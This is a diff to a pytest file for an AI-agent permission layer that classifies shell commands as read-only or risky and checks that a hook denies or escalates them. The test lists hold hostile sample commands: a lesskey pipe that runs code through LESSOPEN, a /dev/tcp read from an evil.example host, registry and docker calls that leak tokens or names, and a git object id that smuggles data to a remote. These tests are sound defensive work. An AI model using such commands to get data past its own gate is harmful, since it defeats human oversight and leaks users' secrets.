@@ -11,17 +11,30 @@ if it were a stash, so anything else is a gated mutation.
 
 from __future__ import annotations
 
+import subprocess
+import time
+from pathlib import Path
+from types import SimpleNamespace
 from typing import Any
 
 import pytest
 
 from grounded_agency import GroundedAgentAdapter, GroundedAgentConfig
+from grounded_agency.capabilities import mapper as mapper_module
 from grounded_agency.capabilities.mapper import ToolCapabilityMapper, ToolMapping
 from grounded_agency.capabilities.registry import CapabilityRegistry
+from tests.conftest import missing_objects
 
 # A commit a checkpoint recorded, and one it did not (a merge commit, say).
 SHA = "0123456789abcdef0123456789abcdef01234567"
 OTHER = "89abcdef0123456789abcdef0123456789abcdef"
+# less reads a lesskey source from the pipe; its #env section sets LESSOPEN,
+# which less runs when it opens f (printf turns each \n into a line break,
+# so the line holds no control character, `$` or backtick).
+LESSKEY_PIPE = (
+    "printf '#env\\nLESSOPEN=|touch PWNED; cat %%s\\n' "
+    "| less --lesskey-src=/dev/stdin f"
+)
 
 
 @pytest.fixture
@@ -304,6 +317,9 @@ def test_arguments_the_classifier_does_not_take_as_read_only(
         "file --mime-type -b x",
         "hostname -f",
         "find . -name '*.py' -type f",
+        # A quoted redirection sign is an argument: _simple_commands reads
+        # the line's redirections.
+        'grep " > " notes.txt',
     ],
 )
 def test_read_only_arguments_stay_read_only(
@@ -341,6 +357,17 @@ def test_read_only_arguments_stay_read_only(
         "pip show requests --proxy http://evil.example:3128",
         "npm list --registry=https://evil.example/S/",
         "npm list --reg https://evil.example/S/",
+        # npm's update check asks the registry a project's .npmrc names, with
+        # the token it gives for that registry (`${ENV}` expanded): a probe
+        # logged `Authorization: Bearer <the secret>` for a plain `npm list`.
+        "npm list",
+        "npm list --depth=0 --json",
+        "npm list -g --all",
+        # The docker daemon DOCKER_HOST or the docker context names, over tcp
+        # or ssh: a probe logged the container name `docker logs` asked for.
+        "docker ps",
+        "docker images 'leak*'",
+        "docker logs secret-data-leaked",
     ],
 )
 def test_a_command_that_reaches_another_host_gets_the_worst_case(
@@ -366,9 +393,6 @@ def test_a_command_that_reaches_another_host_gets_the_worst_case(
         "pip list",
         "pip list --format=json --not-required",
         "pip show -f requests",
-        "npm list",
-        "npm list --depth=0 --json",
-        "npm list -g --all",
     ],
 )
 def test_local_forms_of_those_commands_stay_read_only(
@@ -385,6 +409,9 @@ def test_local_forms_of_those_commands_stay_read_only(
         "npm view lodash --registry=https://evil.example/leak/",
         "cat < /dev/tcp/leak.evil.example/80",
         "kubectl get pods --server=https://evil.example",
+        LESSKEY_PIPE,
+        "npm list",
+        "docker logs secret-data-leaked",
     ],
 )
 async def test_a_destination_policy_refuses_them(
@@ -437,3 +464,235 @@ def test_the_worst_case_includes_send(
     mapping = _bash(mapper, command)
     assert mapping.capabilities == capabilities, command
     assert _gated(mapping), command
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        LESSKEY_PIPE,
+        # A lesskey file, plain or compiled (-k), in forms less accepts.
+        "less --lesskey-src=notes.txt f",
+        "less --lesskey-s=notes.txt f",
+        "less --lesskey-file=keyfile f",
+        "less --lesskey-f=keyfile f",
+        "less -k keyfile f",
+        "less -kkeyfile f",
+        "less --lesskey-content=x f",
+        # And without one: LESSOPEN, a lesskey file in the home directory,
+        # and macOS's more, which is less, run what they name.
+        "less f",
+        "more f",
+        "cat f | more",
+    ],
+)
+def test_a_pager_is_not_read_only(mapper: ToolCapabilityMapper, command: str) -> None:
+    """STANDARD 1.2.0 section 5.18.3: less runs the LESSOPEN a lesskey file
+    sets (the verifier's pipe created PWNED), and its options to load one
+    are many and abbreviable; a pager reads nothing an agent needs that
+    cat does not. These were `observe`."""
+    mapping = _bash(mapper, command)
+    assert mapping.capabilities == ("mutate", "send"), command
+    assert _gated(mapping), command
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        # A quoted run of blanks: 40,000 took 8 s to classify (a pattern
+        # retried from every blank, backtracking over the run).
+        'ls "' + " " * 40_000 + '"',
+        'ls "' + "\u00a0" * 20_000 + '"',
+        'git push origin main; ls "' + " " * 40_000 + '"',
+        "ls " + "a" * 4_094,
+    ],
+)
+def test_a_command_over_4096_bytes_is_the_worst_case_at_once(
+    mapper: ToolCapabilityMapper, command: str
+) -> None:
+    """Over 4096 UTF-8 bytes (the plugin hook's bound) the command is not
+    read: the worst case, before any pattern runs."""
+    start = time.monotonic()
+    mapping = _bash(mapper, command)
+    assert time.monotonic() - start < 1.0
+    assert mapping.capabilities == ("mutate", "send")
+    assert _gated(mapping)
+
+
+def test_a_command_of_4096_bytes_is_still_read(mapper: ToolCapabilityMapper) -> None:
+    blanks = 'ls "' + " " * 4_091 + '"'
+    accented = 'ls "' + "\u00e9" * 2_045 + 'a"'
+    assert len(blanks.encode()) == len(accented.encode()) == 4_096
+    for command in (blanks, accented):
+        start = time.monotonic()
+        assert _bash(mapper, command).capabilities == ("observe",)
+        assert time.monotonic() - start < 1.0
+    # 4,098 bytes in 2,052 characters: the bound counts bytes, as the hook's.
+    over = 'ls "' + "\u00e9" * 2_046 + 'a"'
+    assert len(over) < 4_096 < len(over.encode())
+    assert _bash(mapper, over).capabilities == ("mutate", "send")
+
+
+def _repository(path: Path) -> Path:
+    path.mkdir()
+    subprocess.run(["git", "init", "-q", str(path)], check=True, timeout=60)
+    return path
+
+
+# An object id the agent chose: git sends it to the promisor remote as a
+# `want` line before the remote says it has no such object.
+LEAK = "7365637265742d646174612d6c65616b65642121"
+
+
+class TestPartialClone:
+    """In a partial clone, git fetches each object it lacks from the
+    promisor remote when a command reads it: `git show`, `git log -p` and
+    `git diff` reach that host, and an object id the agent chose goes to it
+    (a request to another system, STANDARD 1.2.0 section 5.18.3). A git
+    command the allow-list reads as `observe` takes the worst case there,
+    in the call's directory (the hook input's `cwd`)."""
+
+    def test_the_fixture_fetches_what_a_read_needs(self, partial_clone: Path) -> None:
+        before = missing_objects(partial_clone)
+        assert before > 0
+        shown = subprocess.run(
+            ["git", "show", "HEAD~1:big.txt"],
+            cwd=partial_clone,
+            capture_output=True,
+            text=True,
+            timeout=60,
+            check=True,
+        )
+        assert shown.stdout == "first\n"
+        assert missing_objects(partial_clone) < before
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "git show HEAD~1:big.txt",
+            f"git show {LEAK}",
+            "git log -p",
+            "git diff HEAD~1 --stat",
+            "git status",
+            "git rev-parse HEAD",
+            "git stash list",
+            "git stash show -p",
+            "ls && git log --oneline",
+        ],
+    )
+    def test_a_git_read_there_gets_the_worst_case(
+        self, mapper: ToolCapabilityMapper, partial_clone: Path, command: str
+    ) -> None:
+        sub = partial_clone / "sub"
+        sub.mkdir()
+        for cwd in (partial_clone, sub):
+            mapping = mapper.map_tool("Bash", {"command": command}, str(cwd))
+            assert mapping.capabilities == ("mutate", "send"), command
+            assert _gated(mapping), command
+        # Other commands keep their class there.
+        assert mapper.map_tool(
+            "Bash", {"command": "ls -la"}, str(partial_clone)
+        ).capabilities == ("observe",)
+
+    def test_in_a_full_clone_they_observe(
+        self, mapper: ToolCapabilityMapper, tmp_path: Path
+    ) -> None:
+        full = _repository(tmp_path / "full")
+        for command in ("git show HEAD", "git log -p", "git stash list"):
+            mapping = mapper.map_tool("Bash", {"command": command}, str(full))
+            assert mapping.capabilities == ("observe",), command
+
+    def test_a_checkpoint_and_a_recorded_restore_keep_their_class(
+        self, mapper: ToolCapabilityMapper, partial_clone: Path
+    ) -> None:
+        """`git stash create` and `git stash apply <checkpoint>` read only
+        objects the local state holds (a probe fetched nothing for either):
+        a checkpoint stays possible in a partial clone."""
+        mapper.is_checkpoint_commit = {SHA}.__contains__
+        cwd = str(partial_clone)
+        created = mapper.map_tool("Bash", {"command": "git stash create"}, cwd)
+        assert created.capabilities == ("checkpoint",)
+        restored = mapper.map_tool("Bash", {"command": f"git stash apply {SHA}"}, cwd)
+        assert restored.capabilities == ("rollback",)
+
+    def test_a_directory_git_cannot_answer_for_is_the_worst_case(
+        self, mapper: ToolCapabilityMapper, tmp_path: Path
+    ) -> None:
+        missing = str(tmp_path / "no-such-directory")
+        mapping = mapper.map_tool("Bash", {"command": "git log"}, missing)
+        assert mapping.capabilities == ("mutate", "send")
+
+    def test_a_lookup_that_fails_is_the_worst_case(
+        self, mapper: ToolCapabilityMapper
+    ) -> None:
+        def broken(cwd: str | None) -> bool:
+            raise OSError("no answer")
+
+        mapper.git_may_fetch = broken
+        mapping = _bash(mapper, "git status")
+        assert mapping.capabilities == ("mutate", "send")
+
+    def test_without_git_it_is_the_worst_case(
+        self, mapper: ToolCapabilityMapper, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        monkeypatch.setattr(mapper_module.shutil, "which", lambda name: None)
+        assert mapper_module.git_may_fetch(None)
+        assert _bash(mapper, "git status").capabilities == ("mutate", "send")
+
+    @pytest.mark.asyncio
+    async def test_a_destination_policy_refuses_it(
+        self, ontology_path: str, partial_clone: Path, tmp_path: Path
+    ) -> None:
+        adapter = GroundedAgentAdapter(
+            GroundedAgentConfig(
+                ontology_path=ontology_path,
+                checkpoint_dir=str(tmp_path / ".cp"),
+                approval="ask",
+                allowed_destinations=["https://hooks.example.com/*"],
+            )
+        )
+        adapter.create_checkpoint(["*"], "t")
+        hook = adapter._make_pretooluse_safety_hook()
+        result = await hook(
+            {
+                "tool_name": "Bash",
+                "tool_input": {"command": f"git show {LEAK}"},
+                "cwd": str(partial_clone),
+            },
+            "g1",
+            None,
+        )
+        out = result.get("hookSpecificOutput") or {}
+        assert out.get("permissionDecision") == "deny"
+        assert str(out.get("permissionDecisionReason")).startswith(
+            "F504 CONSTRAINT_VIOLATED:"
+        )
+
+    @pytest.mark.asyncio
+    async def test_the_permission_callback_classifies_it_where_the_call_runs(
+        self, ontology_path: str, partial_clone: Path, tmp_path: Path
+    ) -> None:
+        """The callback's context carries no `cwd`: it classifies the call
+        in the directory its PreToolUse input named, so it does not allow,
+        as an observation, a call the hook put to a person."""
+        adapter = GroundedAgentAdapter(
+            GroundedAgentConfig(
+                ontology_path=ontology_path,
+                checkpoint_dir=str(tmp_path / ".cp"),
+                approval="ask",
+            )
+        )
+        adapter.create_checkpoint(["*"], "t")
+        pre = adapter._make_pretooluse_safety_hook()
+        callback = adapter._make_permission_callback(None)
+        args = {"command": "git log -p"}
+        result = await pre(
+            {"tool_name": "Bash", "tool_input": args, "cwd": str(partial_clone)},
+            "g2",
+            None,
+        )
+        assert result["hookSpecificOutput"]["permissionDecision"] == "ask"
+
+        decision = await callback("Bash", args, SimpleNamespace(tool_use_id="g2"))
+
+        assert getattr(decision, "behavior", None) != "allow"
+        assert decision.message.startswith("F502 APPROVAL_REQUIRED:")
